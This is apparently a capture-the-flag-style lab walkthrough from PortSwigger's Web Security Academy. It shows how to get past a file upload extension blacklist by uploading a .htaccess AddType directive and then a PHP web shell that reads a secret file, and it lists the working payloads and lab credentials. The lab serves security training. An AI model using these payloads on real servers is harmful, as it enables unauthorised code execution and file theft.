## Web shell upload via extension blacklist bypass

**Category:** file_upload
**Difficulty:** Medium

### Description
This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.

### Solution Steps
1. Login with valid credentials (wiener:peter)
2. Navigate to the avatar upload functionality (POST /my-account/avatar)
3. Attempt to upload a PHP web shell (exploit.php) - observe it gets blocked
4. Note the server uses Apache - we can override configuration per-directory
5. First, upload a .htaccess file with content: `AddType application/x-httpd-php .l33t`
6. This tells Apache to execute .l33t files as PHP
7. Now upload your web shell with the new extension: `exploit.l33t`
8. Web shell content: `<?php echo file_get_contents('/home/carlos/secret'); ?>`
9. Navigate to /files/avatars/exploit.l33t to execute the shell
10. The secret file contents will be displayed in the response

### Key Payloads
- `/home/carlos/secret`
- `wiener:peter`
- `/files/avatars/<YOUR-IMAGE>`
- `exploit.php`
- `<?php echo file_get_contents('/home/carlos/secret'); ?>`
- `.php`
- `POST /my-account/avatar`
- `filename`
- `.htaccess`
- `AddType application/x-httpd-php .l33t`
- `Content-Type: text/plain`

### Indicators of Success
- .htaccess file uploads successfully (no error)
- Web shell with custom extension uploads successfully
- Accessing /files/avatars/exploit.l33t returns file contents, not source code
- Secret value is displayed in response body

---
*Source: PortSwigger Web Security Academy*
